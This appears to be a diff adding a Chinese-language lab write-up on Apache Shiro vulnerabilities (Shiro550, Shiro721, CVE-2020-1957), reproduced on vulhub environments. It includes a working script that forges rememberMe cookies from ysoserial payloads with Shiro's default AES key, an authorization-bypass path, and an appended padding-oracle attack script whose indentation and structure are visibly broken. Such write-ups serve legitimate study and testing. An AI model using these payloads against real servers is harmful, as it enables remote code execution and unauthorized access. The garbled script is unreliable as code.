@@ -1,0 +1,330 @@
+# Shiro 常见漏洞
+
+Apache Shiro 是：
+
+> **一个 Java 安全框架（认证 + 授权 + 会话管理）**
+
+存在 Shiro550 和 Shiro721 两个主要的反序列化漏洞，都与一个叫做"RememberMe"的参数有关
+
+
+
+- shiro典型流量特征：
+
+浏览器 / Burp 抓包，看响应头或请求头
+
+```
+Set-Cookie: rememberMe=deleteMe
+```
+
+那么大概率是shiro了
+
+
+
+- 什么是 rememberMe？
+
+
+```
+Shiro 会把你的身份信息放进一个 Cookie
+而这个 Cookie 就叫：rememberMe
+
+Shiro 会把客户端传回来的 rememberMe 解密 + 反序列化
+攻击者便可以利用这一点进行攻击
+
+```
+
+
+
+## shiro550（CVE-2016-4437）
+
+此版本 ： rememberMe = Base64(AES(key, 序列化payload))
+
+#### **影响版本**
+
+Apache Shiro <= 1.2.4
+
+
+
+#### **漏洞原理（攻击链）:**
+
+```
+ysoserial 生成序列化 payload
+↓
+用 key 加密（AES）
+↓
+Base64 编码
+↓
+塞进 rememberMe Cookie
+↓
+服务器解密
+↓
+反序列化
+↓
+触发 gadget
+```
+
+
+
+#### **复现流程：**
+
+从vulhub上下载环境
+
+```
+docker compose up -d  //开启环境
+```
+
+
+
+访问8080端口
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260412220813.png)
+
+
+
+
+
+登入勾选rememberme，抓包查看
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260412220927.png)
+
+可以看到返回包cookie里有rememberme生成
+
+
+
+已经知道rememberme我们可控，那么接下来用ysoserial来构造恶意payload：
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260412223540.png)
+
+payload已被写入poc.ser文件
+
+
+
+因为shiro会对序列化数据进行加密，编码后再放入rememberme。所以还需要一个脚本对刚刚得到的payload进行处理
+
+
+
+脚本代码如下：
+
+```
+import sys
+import uuid
+import base64
+from Crypto.Cipher import AES
+
+def encode_rememberme():
+    f = open('poc.ser','rb')
+    BS = AES.block_size
+    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
+    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+    iv = uuid.uuid4().bytes
+    encryptor = AES.new(key, AES.MODE_CBC, iv)
+    file_body = pad(f.read())
+    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
+    return base64_ciphertext
+
+if __name__ == '__main__':
+    payload = encode_rememberme()   
+    print("rememberMe={0}".format(payload.decode()))
+```
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260412223609.png)
+
+执行后得到最终payload（注意脚本需要和poc.ser放在同一文件夹）
+
+
+
+最后burp修改rememberme，进而触发反序列化
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260412234314.png)
+
+
+
+## Shiro721(CVE-2019-12422)
+
+#### 影响版本：
+
+Apache Shiro < 1.4.2
+
+
+
+#### 利用条件：
+
+能获取到合法的正常的rememberme cookie，通俗的说就是要先有账号密码能登入进系统。
+
+
+
+#### 漏洞原理：
+
+前面提到shiro550，后面shiro通过将 默认密钥修改为**随机密钥或者自定义密钥** 修复了此漏洞。但是加密方式仍然没有改变，还是AES-CBC，**利用服务端对 padding 的可区分反馈**，如果拿到了合法的cookie就可以借助Padding Oracle Attack（填充预言攻击）来爆破密钥，进一步达到rce的目的。
+
+
+
+**总而言之，原因就是AES-CBC此加密算法容易被攻击**
+
+
+
+#### 复现流程：
+
+##### 手工复现流程（简要）：
+
+拿到账号密码进行登入，拿到合法正常的rememberme>>>ysoserial生成恶意payload>>>前面两者都传入脚本，利用服务端对 padding 的可区分反馈，进行padding oracle attack>>>最后生成恶意rememberme
+
+
+
+文章末尾会附上爆破脚本
+
+
+
+##### 工具复现：
+
+由于手工复现较为麻烦且大部分和shiro550相似，这里我用了自动化工具来复现。此工具也适用于550
+
+工具：https://github.com/SummerSec/ShiroAttack2?tab=readme-ov-file
+
+工具gui：
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260414221738.png)
+
+
+
+先输入指定url，然后开始爆破密钥。（字典要求我们自己提供，放在data文件夹下）
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260415002158.png)
+
+这里是借助字典进行爆破的，并不是Padding Oracle Attack。若手工采用脚本来Padding Oracle Attack，爆破时间会非常久。
+
+
+
+爆破完密钥就可以进行rce了。
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260415002212.png)
+
+
+
+#### 修复方式：
+
+把 rememberMe 默认使用的加密模式从 AES-CBC 改成了 AES-GCM
+
+GCM 是一种 **带认证的加密模式**。直白说，服务端会先发现“密文被改过”，不会再像 CBC 那样给攻击者留下基于 padding 反馈慢慢试探的空间，所以 721 这条利用链就被切断了。官方把这个修复和 **CVE-2019-12422** 一起放进了 1.4.2 的安全更新说明里。
+
+
+
+## CVE-2020-1957 (Apache Shiro 认证绕过漏洞)
+
+#### **影响版本**:
+
+Shiro < 1.5.2
+
+
+
+#### **漏洞原理：**
+
+对于/xxx/..;/绕过，在**shiro**中，当拿到/xxx/..;/aa/的时候，会根据 ; 进行截断，认为访问的是/xxx/..，然后再拿着/xxx/..在需要进行权限判断的地方去找，若发现不需要权限校验，则放行至spring进行处理。
+
+​    在**Spring**中会对输入的url进行处理，首先对于/xxx/..;/aa/，先通过**removeSemicolonContent**去掉 ; 符号，即/xxx/..;/aa/，最终访问的是/aa/，绕过了权限限制。
+
+
+
+#### **复现流程：**
+
+还是vulhub上的环境
+
+```
+docker compose up -d //开启环境
+```
+
+访问127.0.0.1:8080/admin 会重定向到login.html
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260413154213.png)
+
+
+
+构造恶意请求`/xxx/..;/admin/`，即可绕过权限校验，访问到管理页面：
+
+![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260415002231.png)
+
+
+
+
+
+# 
+
+padding oracle attack脚本：
+
+    from paddingoracle import BadPaddingException, PaddingOracle
+    from base64 import b64encode, b64decode
+    from urllib import quote, unquote
+    import requests
+    import socket
+    import time
+
+
+​    
+    class PadBuster(PaddingOracle):
+        def __init__(self, **kwargs):
+            super(PadBuster, self).__init__(**kwargs)
+            self.session = requests.Session()
+            # self.session.cookies['JSESSIONID'] = '18fa0f91-625b-4d8b-87db-65cdeff153d0'
+            self.wait = kwargs.get('wait', 2.0)
+    def oracle(self, data, **kwargs):
+        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)
+        self.session.cookies['rememberMe'] = somecookie
+        if self.session.cookies.get('JSESSIONID'):
+            del self.session.cookies['JSESSIONID']
+    
+        # logging.debug(self.session.cookies)
+    
+        while 1:
+            try:
+                response = self.session.get(sys.argv[1],
+                        stream=False, timeout=5, verify=False)
+                break
+            except (socket.error, requests.exceptions.RequestException):
+                logging.exception('Retrying request in %.2f seconds...',
+                                  self.wait)
+                time.sleep(self.wait)
+                continue
+    
+        self.history.append(response)
+    
+        # logging.debug(response.headers)
+    
+        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):
+            logging.debug('No padding exception raised on %r', somecookie)
+            return
+    
+        # logging.debug("Padding exception")
+        raise BadPaddingException
+        
+        if __name__ == '__main__':
+        import logging
+        import sys
+        
+        if not sys.argv[3:]:
+        print 'Usage: %s <url> <somecookie value> <payload>' % (sys.argv[0], )
+        sys.exit(1)
+    
+    logging.basicConfig(level=logging.DEBUG)
+    encrypted_cookie = b64decode(unquote(sys.argv[2]))
+    
+    padbuster = PadBuster()
+    
+    payload = open(sys.argv[3], 'rb').read()
+    
+    enc = padbuster.encrypt(plaintext=payload, block_size=16)
+    
+    # cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))
+    
+    # print('Decrypted somecookie: %s => %r' % (sys.argv[1], enc))
+    print('rememberMe cookies:')
+    print(b64encode(enc))
+
+
+
+
+
+
+
+
+
+
+
